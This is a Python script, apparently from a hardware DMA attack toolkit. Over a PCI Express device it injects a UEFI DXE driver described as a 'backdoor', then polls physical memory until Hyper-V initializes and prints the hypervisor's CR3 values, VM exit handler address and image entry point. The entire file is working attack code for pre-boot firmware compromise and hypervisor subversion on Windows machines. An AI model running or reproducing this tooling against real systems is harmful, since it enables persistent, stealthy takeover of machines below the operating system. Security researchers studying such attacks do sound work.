#!/usr/bin/env python

import sys, os
from struct import pack, unpack
from hexdump import hexdump

from pcie_lib import *
from uefi import *

HV_INFO_ADDR = STATUS_ADDR - (8 * 5)

def main():

    payload = sys.argv[1] if len(sys.argv) > 1 else None

    dev = dxe_inject(payload = payload)
        
    if payload is None: return 0

    print('[+] DXE driver was planted, waiting for backdoor init...')    

    while True:

        # wait for DXE backdoor
        status = dev.mem_read_8(STATUS_ADDR)
        
        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        print('[+] DXE driver was executed')

        break

    print('[+] Waiting for Hyper-V init...')

    dev.mem_write_8(HV_INFO_ADDR, 0)

    while True:

        # wait for hypervisor
        status, winload_cr3, hv_cr3, hv_entry, hv_base = unpack('qQQQQ', dev.mem_read(HV_INFO_ADDR, 8 * 5))

        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        if status == -1:

            print('ERROR: DXE driver is unable to locate winload.efi')
            break

        if status == -2:

            print('ERROR: DXE driver is unable to locate winload!HvlpBelow1MbPage')
            break

        if status == -3:

            print('ERROR: HvlpBelow1MbPage is not allocated, Hyper-V wasn\'t started')
            break

        if status == -4:

            print('ERROR: DXE driver is unable to locate winload!HvlpTransferToHypervisor')
            break

        print('[+] Hyper-V image entry was executed\n')
        print('              Winload CR3: 0x%.16x' % winload_cr3)
        print('              Hyper-V CR3: 0x%.16x' % hv_cr3)
        print('  Hyper-V VM exit handler: 0x%.16x' % hv_base)
        print('      Hyper-V image entry: 0x%.16x\n' % hv_entry)

        break

    print('[+] DONE')
    
    dev.close()

    return 0

if __name__ == '__main__':

    exit(main())
